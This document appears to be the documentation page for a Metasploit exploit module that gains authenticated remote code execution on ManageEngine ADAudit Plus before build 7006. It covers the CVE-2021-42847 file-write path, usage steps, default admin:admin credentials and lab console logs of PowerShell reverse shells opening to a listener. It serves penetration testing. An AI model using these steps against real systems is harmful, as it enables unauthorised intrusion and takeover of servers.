## Vulnerable Application
The module exploits security issues in ManageEngine ADAudit Plus prior to 7006 that allow authenticated users to execute arbitrary code
by creating a custom alert profile and leveraging the custom alert script component.

The module first runs a few checks to test the provided credentials, retrieve the configured domain(s) and obtain the build number.
If the credentials are valid and the target is vulnerable, the module creates an alert profile that will be triggered
for any failed login attempt to the configured domain.

For versions prior to build 7004, the payload is directly inserted in the custom alert script component of the alert profile.

For builds 7004 and 7005, the module leverages an arbitrary file write vulnerability (CVE-2021-42847) to create a Powershell script
in the alert_scripts directory that contains the payload.
The name of this script is then provided as the value for the custom alert script component of the alert profile.

The module will automatically delete the created alert profile before completing. This happens even if no shell was obtained.

This module requires valid credentials for an account with the privileges to create alert scripts.
It has been successfully tested against ManageEngine ADAudit Plus builds 7003 and 7005 running on Windows Server 2012 R2.

## Installation Information
Vulnerable versions of ADAudit Plus are available [here](https://archives2.manageengine.com/active-directory-audit/).

After running the installer, you can launch ADAudit Plus by opening Command Prompt with administrator privileges
and then running: `<install_dir>\bin\run.bat`

Versions 7005 and prior are vulnerable by default, so no special configuration is required after installing the application.

The default ADAudit Plus credentials (set as default options for the module) are `admin`:`admin`

## Verification Steps
1. Start msfconsole
2. Do: `use exploit/windows/http/manageengine_adaudit_plus_authenticated_rce`
3. Do: `set RHOSTS [IP]`
4. Do: `set LHOST [IP]`
5. Do: `set USERNAME [username]`
6. Do: `set PASSWORD [password]`
7. Do: `exploit`

## Options
### AUTH_DOMAIN
The ADAudit Plus authentication domain to use. The default is `ADAuditPlus Authentication`. If the provided domain
does not match an authentication domain that is configured for the target, the module will throw an error and inform the user.

### USERNAME
Username to authenticate with. The default is `admin`, which matches the default ADAudit Plus credentials

### PASSWORD
Password to authenticate with. The default is `admin`, which matches the default ADAudit Plus credentials

## Scenarios
### ManageEngine ADAudit Plus build 7003 running on Windows Server 2012 R2
```
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > options 

Module options (exploit/windows/http/manageengine_adaudit_plus_authenticated_rce):

   Name         Current Setting             Required  Description
   ----         ---------------             --------  -----------
   AUTH_DOMAIN  ADAuditPlus Authentication  yes       ADAudit Plus authentication domain (default is ADAuditPlus Authentication)
   PASSWORD     admin                       yes       Password to authenticate with
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.168.91.250              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        8081                        yes       The target port (TCP)
   SSL          false                       no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                           yes       The base path to ManageEngine ADAudit Plus
   USERNAME     admin                       yes       Username to authenticate with
   VHOST                                    no        HTTP server virtual host


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         192.168.91.195   yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Command


msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.91.195:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Using configured authentication domain alias LIES.
[*] Trying to authenticate...
[*] Found 1 configured domain(s):
[*] - LIES.local: LIES.local
[+] Successfully authenticated
[+] The target appears to be vulnerable. The target is ADAudit Plus 7003
[*] Attempting to create an alert profile
[+] Successfully created alert profile UiYnupjyi24
[*] Attempting to trigger the payload via an authentication attempt for domain LIES using incorrect credentials.
[*] Trigger attempt completed. Let's hope we get a shell...
[*] Powershell session session 1 opened (192.168.91.195:4444 -> 192.168.91.250:54442) at 2022-10-12 12:09:43 +0300
[*] Powershell session session 2 opened (192.168.91.195:4444 -> 192.168.91.250:54441) at 2022-10-12 12:09:43 +0300
[*] Attempting to delete alert UiYnupjyi24
[+] Successfully deleted alert UiYnupjyi24

PS C:\Program Files\ManageEngine\ADAudit Plus\bin>
```

### ManageEngine ADAudit Plus build 7005 running on Windows Server 2012 R2
```
msf6 exploit(windows/http/manageengine_adaudit_plus_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.91.195:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Using configured authentication domain alias LIES.
[*] Trying to authenticate...
[*] Found 1 configured domain(s):
[*] - LIES.local: LIES.local
[+] Successfully authenticated
[+] The target appears to be vulnerable. The target is ADAudit Plus 7005 and the endpoint for CVE-2021-42847 exists.
[*] Attempting to authenticate again in order to retrieve the required cookies.
[*] Attempting to create an alert profile
[*] Attempting to write the payload to /alert_scripts/mwlhr.ps1
[+] Successfully wrote the payload to /alert_scripts/mwlhr.ps1 in the ManageEngine ADAudit Plus install directory
[+] Successfully created alert profile dVmy0Ygz
[*] Attempting to trigger the payload via an authentication attempt for domain LIES using incorrect credentials.
[*] Trigger attempt completed. Let's hope we get a shell...
[!] Make sure to manually cleanup the mwlhr.ps1 file from /alert_scripts/ in the ManageEngine ADAudit Plus install directory
[*] Powershell session session 1 opened (192.168.91.195:4444 -> 192.168.91.250:41348) at 2022-10-12 12:59:28 +0300
[*] Powershell session session 2 opened (192.168.91.195:4444 -> 192.168.91.250:41347) at 2022-10-12 12:59:28 +0300
[*] Attempting to delete alert profile dVmy0Ygz
[+] Successfully deleted profile alert dVmy0Ygz

PS C:\Program Files\ManageEngine\ADAudit Plus\bin>
```
